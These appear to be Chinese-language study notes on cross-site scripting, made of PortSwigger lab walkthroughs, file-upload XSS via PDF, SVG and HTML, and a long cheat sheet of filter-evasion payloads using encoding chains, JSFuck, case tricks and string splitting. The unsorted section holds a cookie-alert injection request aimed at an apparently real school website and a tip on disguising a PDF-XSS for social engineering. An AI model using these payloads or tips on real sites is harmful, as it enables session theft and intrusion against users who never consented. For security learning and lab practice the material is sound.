XSS 最终是在前端执行的, 而后端往往会对传入的字符进行处理, 避免执行 XSS.

## 1. 原理

当我搜索 test 时

```
GET /?search=test HTTP/2
Host: web-security-academy.net
```

后端会将我输入的字符处理后返回到前端

```
<h1>1 search results for 'test'</h1>
```

若我搜索的内容是一段 XSS, 那么前端就会执行

```
<h1>0 search results for '<script>alert(1)</script>'</h1>
```

### 1.1 常用执行函数

| 弹窗验证                  | 控制台验证                      |
| ------------------------- | ------------------------------- |
| alert(document.cookie);   | console.log(document.cookie);   |
| confirm(document.cookie); | console.info(document.cookie);  |
| prompt(document.cookie);  | console.error(document.cookie); |
|                           | console.warn(document.cookie);  |

### 1.2 常用触发事件

```
onload="alert(1)"	    # 元素加载完成时触发
onerror="alert(1)"	    # 元素加载失败时触发（常用于 <img>）
onmousemove="alert(1)"	# 鼠标移动到元素上方时触发
onclick="alert(1)"	    # 点击元素时触发
ondblclick="alert(1)"	# 双击元素时触发
onmouseover="alert(1)"	# 鼠标悬停在元素上方时触发
onmousedown="alert(1)"	# 鼠标按下时触发
onmouseup="alert(1)"	# 鼠标松开时触发
onfocus="alert(1)"	    # 元素获得焦点时触发（如 <input>）
```

## 2. 插入式 XSS

### 2.1. [Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)

查看前端代码

```
<h1>1 search results for 'test'</h1>
```

后端未对传入的字符进行任何处理

```
<script>alert(1)</script>
```

### 2.2. [Stored XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)

查看前端代码

```
<p>test</p>
```

后端未对传入的字符进行任何处理

```
<script>alert(1)</script>
```

### 2.3. [DOM XSS in `document.write` sink using source `location.search`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)

查看前端代码

```
<h1>3 search results for 'test'</h1>
```

后端对传入的特殊字符进行 HTML 转义

```
<h1>0 search results for '&lt;script&gt;alert(1)&lt;/script&gt;'</h1>
```

提交这个字符串可以判断过滤了哪些字符，有的字符只可在 IE 中使用

```
xss"""'`>,:;onmousemovejavascriptstyle(1)
```

```
<h1>0 search results for 'xss"""'\`&gt;,:;onmousemovejavascriptstyle(1)'</h1>
```

可以看到特殊字符被转义, 可是在另一个位置返回以下前端代码, 怀疑存在 DOM XSS

```
<img src="/resources/images/tracker.gif?searchTerms=xss" ""'`="">
,:;onmousemovejavascriptstyle(1)"&gt; 
```

简化这段前端代码

```
<img src="/resources/images/tracker.gif?searchTerms=">
```

由于这段代码处于 `<img>` 标签中, 可通过插入事件触发

```
xss" onerror="alert(1)"
```

或者通过闭合 `<img>` 标签触发

```
"><img src="x" onerror="alert(1)">
"><svg onload=alert(1)>
"><script>alert(1)</script>
```

## 3. 嵌入式 XSS

在文件中嵌入恶意脚本后上传, 当目标加载文件时会触发 XSS 攻击.

常见的嵌入式 XSS 有 PDF-XSS, SVG-XSS, HTML-XSS, XML-XSS

> 触发 PDF-XSS 需要 PDF 查看器中可执行嵌入的 JavaScript; 如 Chromium, Adobe Acrobat
>
> 访问 PDF-XSS 链接时的请求参数不能随意删除，否则无法触发
>
> 社工时可以使用 [iLovePDF](https://www.ilovepdf.com/zh-cn/merge_pdf) 将正常 PDF 与 PDF-XSS 合并

若目标仅在前端校验可上传一张 PNG 文件，然后在 Burp Suite 中修改为 HTML

```http
Content-Disposition: form-data; name="uploaded"; filename="XSS.png"

 PNG
```

```http
Content-Disposition: form-data; name="uploaded"; filename="XSS.html"

 PNG
<script>alert(1)</script>
```

从 Burp Suite 中查找关键词 XSS.html 得到路径后访问 URL 即可触发 XSS

```
../../hackable/uploads/XSS.html succesfully uploaded!
```

```
http://debian.local/dvwa/hackable/uploads/XSS.html
```

某些情况下文件上传处是通过编码上传的, 可以通过修改文件类型及文件编码嵌入 XSS

```
data:image/png;base64,VGhpcyBpcyBhIHRlc3QgZmllbGQ=
```

```
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

---

参考链接

- [xss](https://github.com/jadensalas469466/tools/tree/main/hack/payload/xss)
- [pdfsvgxsspayload](https://github.com/ynsmroztas/pdfsvgxsspayload)

## ==未归纳==

```html
"><script>alert(1)</script>
```

```
GET /show/login/show_error_page.action?errorMsg=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E HTTP/1.1
Host: hb.wanguoschool.com

```

>  URL 编码

存储型 xss 使用控制台返回

```html
<script>console.log(1)</script>
```

在 JS 标签中只允许执行英文小写

```
javascript
```

分隔符绕过，某些分隔符会让后面的字符串变成新的属性，例如：`<input type="text" name="p1" value="xss"> ,:;onmousemove="alert(6)"` ，生成了 `onmousemove=""` 属性

```
xss"> ,:;onmousemove=alert(1)
```

任意标签可插入 JS 标签绕过

```
<script>alert(6)</script>
<script>alert(6)</script></b>
```

标签闭合，即可插入 JS 标签

```
xss"><script>alert(6)</script>
<input type="text" name="p1" value="xss"><script>alert(6)</script>
```

`input` 事件绕过，很多标签过滤了 `<>` 可以通过插入事件绕过（ `input` 中若过滤了 `""` 则肯定无法绕过）

```
xss" onmousemove="alert(6)">
<input type="text" name="p1" value="xss" onmousemove="alert(6)">">
```

`href` 伪协议绕过，可以将 URL 地址指向一个伪协议

```
javascript:alert(6)
<a href="javascript:alert(6)">javascript:alert(6)</a>
```

双写绕过，有的过滤规则是将 javascript 或 script 替换为空

```
javajavascriptscript
```

大小写绕过，有的过滤规则无法识别大小写

```
jaVaScRipT
```

atob 解 Base64 编码绕过

```
<script>eval(atob("YWxlcnQoNik="))</script>
```

Tab HTML 实体编号绕过，有的过滤规则是将 javascript 转义为 javaxscript ，可以利用 Tab HTML 实体编号绕过

```
<a href="javasc&#09;ript:alert(6)">xss</a>
```

IE 浏览器 input 标签 style 属性伪协议绕过

```
style="background-image:url(javascript:alert(6))"
```

IE 浏览器的 expression 绕过

```
hello:expression(alert(6))
```

CSS 层叠样式表注释会替换为空

```
hello:expr/**/ession(alert(6))
```

尖括号的十六进制编码绕过

```
\\x3cscript\\x3ealert(6);\\x3c/script\\x3e
```

**js 中的编码 `<script></script>` 解码后执行**

ASCII

```
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
```

Base64

```
eval(atob("YWxlcnQoMSk="))
```

**无需解码直接执行**

hex

```
eval("\x61\x6c\x65\x72\x74\x28\x31\x29")
```

unicode

```
\u0061\u006c\u0065\u0072\u0074("\u0031")
```

jsfuck

```
[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])
```

```
在 jsfuck 中 eval        =>  []["filter"]["constructor"]( CODE )()
```

伪协议绕过(空格可以用 / 代替)

```
<img/src/onerror=location="javascript:alert(1)">
```

**目标执行顺序**

```
1.浏览器解析 HTML 标签	自动解码 HTML 的值	location="javascript:alert(1)" 为 onerror 属性的值
2.浏览器解析 location 中的 url	自动解码 URL 编码 alert(1)
3.浏览器识别 javascript 伪协议	自动解码 js 编码 alert(1)	（括号和括号内的不能编两次）

黑客编码顺序反过来321

编码过程:JS编码→伪协议URL编码→HTML编码→（URL编码传输给服务器→服务器解码URL），（）中的为浏览器向目标传输数据的编码，无需操作

解码过程:解码HTML编码→伪协议解码URL编码→JS解释器自动解码JS编码→执行
```

1.对 alert(1) 进行 unicode 编码（有的时候也可以直接对 () 进行编码，hex 不可以）

```
\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029
<img/src/onerror=location="javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029">
```

2.对 alert 的 unicode 编码进行 url 编码 （括号和括号里的值不能编两次，也可以不进行 unicode 编码而进行 url 编码，二者只能选择其一）

```
%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34
```

```
<img/src/onerror=location="javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34\u0028\u0031\u0029">
```

3.对 location="javascript:alert(1)" 的 alert(1) 进行 unicode 编码后又对 alert 进行编码后对  location="javascript:alert(1)" 这个编码的结果再进行 html 编码

```
&#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x31;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x33;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x32;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x34;&#x5c;&#x75;&#x30;&#x30;&#x32;&#x38;&#x5c;&#x75;&#x30;&#x30;&#x33;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x32;&#x39;&#x22;
```

```
<img/src/onerror=&#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x31;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x33;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x32;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x34;&#x5c;&#x75;&#x30;&#x30;&#x32;&#x38;&#x5c;&#x75;&#x30;&#x30;&#x33;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x32;&#x39;&#x22;>
```

字符串切割：

```
字符串中的部分（""中的内容） "javascript:alert(1)" 可以写成	"j"+"a"+"v"+"a"+"s"+"c"+"r"+"i"+"p"+"t"+":"+"a"+"l"+"e"+"r"+"t"+"("+"1"+")"
```

```
<img/src/onerror=location="j"+"a"+"v"+"a"+"s"+"c"+"r"+"i"+"p"+"t"+":"+"a"+"l"+"e"+"r"+"t"+"("+"1"+")">
```

注释绕过（`/*注释*/`）

```
<input onfocus=location="java&#09;sc"+/**/"ript:\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029" autofocus>
```

注释加入到分割

```
<img/src/onerror=location="j"+"a"+/**/"v"+"a"+"s"+"c"+"r"+"i"+"p"+"t"+":"+"a"+"l"+"e"+"r"+"t"+"("+"1"+")">
```

svg 可以自动解析 js 标签中的 html 编码

```
<svg><script>alert(1)</script>
```

```
<svg><script>&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script>
```

